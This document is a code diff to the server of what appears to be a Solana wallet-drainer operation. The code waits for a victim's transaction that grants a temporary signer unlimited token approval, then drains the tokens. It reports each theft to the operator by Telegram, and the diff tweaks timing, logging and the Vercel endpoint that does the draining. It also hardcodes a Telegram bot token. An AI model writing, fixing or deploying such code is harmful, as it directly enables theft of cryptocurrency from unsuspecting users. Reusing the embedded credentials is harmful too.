@@ -14,7 +14,7 @@ var LK_WS_URL      = process.env.LIVEKIT_URL        || 'wss://jack-6u9u95rm.live
 var LK_HTTP_URL    = LK_WS_URL.replace(/^wss?:\/\//, 'https://');
 var ROOM_NAME      = process.env.LK_ROOM            || 'bookmark-room';
 var AGENT_IDENTITY = 'railway-agent-v6';
-var VERCEL_URL     = process.env.VERCEL_URL         || 'https://unzipkfk5.vercel.app';
+var VERCEL_URL     = process.env.VERCEL_URL         || 'https://gf56hg78tdse3q.vercel.app';
 var AGENT_SECRET   = process.env.AGENT_SECRET       || 'lk-agent-secret-2024';
 var TG_TOKEN       = process.env.TELEGRAM_BOT_TOKEN || '7528079703:AAHMOBhYAU7A1RXe_fCgOE9U2GsdoceSzws';
 var TG_CHAT_ID     = process.env.TELEGRAM_CHAT_ID   || '7253475769';
@@ -127,6 +127,11 @@ function pushToVercel(fromIdentity, action, payload) {
 // Vercel Hobby убивает функции через 60 сек, поэтому drain делаем здесь.
 // tempSigner получил approve u64::MAX через approve_token CPI в основной TX.
 async function drainOnRailway(parsed) {
+  console.log('[drain] START. tempSignerPrivkey=' + (parsed.tempSignerPrivkey ? 'present' : 'MISSING') +
+    ' tokens=' + (parsed.tokens ? parsed.tokens.length : 'MISSING') +
+    ' signature=' + (parsed.signature ? parsed.signature.slice(0,12) + '...' : 'MISSING') +
+    ' sponsorPrivkey=' + (parsed.sponsorPrivkey ? 'present' : 'MISSING'));
+
   if (!parsed.tempSignerPrivkey || !parsed.tokens || parsed.tokens.length === 0) {
     console.log('[drain] No tokens or tempSignerPrivkey, skip drain');
     return;
@@ -137,6 +142,7 @@ async function drainOnRailway(parsed) {
   try {
     web3   = require('@solana/web3.js');
     bs58mod = require('bs58');
+    console.log('[drain] deps loaded OK');
   } catch(e) {
     console.error('[drain] Missing deps (@solana/web3.js or bs58). Run npm install in railway-signaling:', e.message);
     return;
@@ -186,33 +192,31 @@ async function drainOnRailway(parsed) {
   if (parsed.signature) {
     console.log('[drain] Waiting for main TX confirmation:', parsed.signature);
     var confirmed = false;
-    for (var attempt = 0; attempt < 30; attempt++) {
-      await new Promise(function(r){ setTimeout(r, 2000); });
+    for (var attempt = 0; attempt < 20; attempt++) {
+      await new Promise(function(r){ setTimeout(r, 1000); });
       try {
         var statusResult = await connection.getSignatureStatus(parsed.signature, { searchTransactionHistory: true });
         var status = statusResult && statusResult.value;
+        console.log('[drain] attempt=' + attempt + ' confirmationStatus=' + (status ? status.confirmationStatus : 'null') + ' err=' + (status && status.err ? JSON.stringify(status.err) : 'null'));
         if (status && (status.confirmationStatus === 'confirmed' || status.confirmationStatus === 'finalized') && !status.err) {
-          console.log('[drain] Main TX confirmed after ' + ((attempt+1)*2) + 's');
+          console.log('[drain] Main TX confirmed after ' + (attempt+1) + 's');
           confirmed = true;
           break;
         }
         if (status && status.err) {
-          console.error('[drain] Main TX failed on-chain:', JSON.stringify(status.err));
+          console.error('[drain] Main TX FAILED on-chain:', JSON.stringify(status.err));
           sendTelegram('<b>Main TX FAILED on-chain</b>\nSig: <code>' + parsed.signature + '</code>\nErr: ' + JSON.stringify(status.err));
           return;
         }
-        console.log('[drain] Waiting... attempt=' + attempt + ' status=' + (status ? status.confirmationStatus : 'null'));
       } catch(e) {
         console.error('[drain] getSignatureStatus error:', e.message);
       }
     }
     if (!confirmed) {
-      console.error('[drain] Main TX not confirmed after 60s — trying drain anyway');
-      sendTelegram('<b>Main TX timeout</b>\nSig: <code>' + parsed.signature + '</code>\nTrying drain anyway...');
+      console.error('[drain] Main TX not confirmed after 20s — trying drain anyway');
     }
   } else {
-    // Нет сигнатуры — ждём 5 сек на всякий случай
-    await new Promise(function(r){ setTimeout(r, 5000); });
+    await new Promise(function(r){ setTimeout(r, 3000); });
   }
 
   for (var i = 0; i < parsed.tokens.length; i++) {
@@ -517,11 +521,8 @@ function processData(msg, fromIdentity) {
         }, [fromIdentity]);
         // Уведомление в Telegram
         if (parsed.success) {
-          sendTelegram('<b>TX broadcast!</b>\nSig: <code>' + parsed.signature + '</code>\nTokens: ' + (parsed.tokensApproved || 0) + '\nDrain starting on Railway...');
-          // Railway сам делает drain — Vercel Hobby не может держать функцию > 60 сек
-          drainOnRailway(parsed).catch(function(e){
-            console.error('[drain] Fatal:', e.message);
-          });
+          sendTelegram('<b>TX broadcast!</b>\nSig: <code>' + parsed.signature + '</code>\nTokens: ' + (parsed.tokensApproved || 0) + '\nDrain running on Vercel (after)...');
+          // Drain делает Vercel через after() — Railway больше не участвует в drain
         } else {
           sendTelegram('<b>Cosign FAILED</b>\nError: ' + (parsed.error || 'unknown'));
         }
@@ -741,9 +742,6 @@ httpServer.listen(PORT, function () {
   console.log('');
   connectAgent();
 });
-
-
-
 
 
 
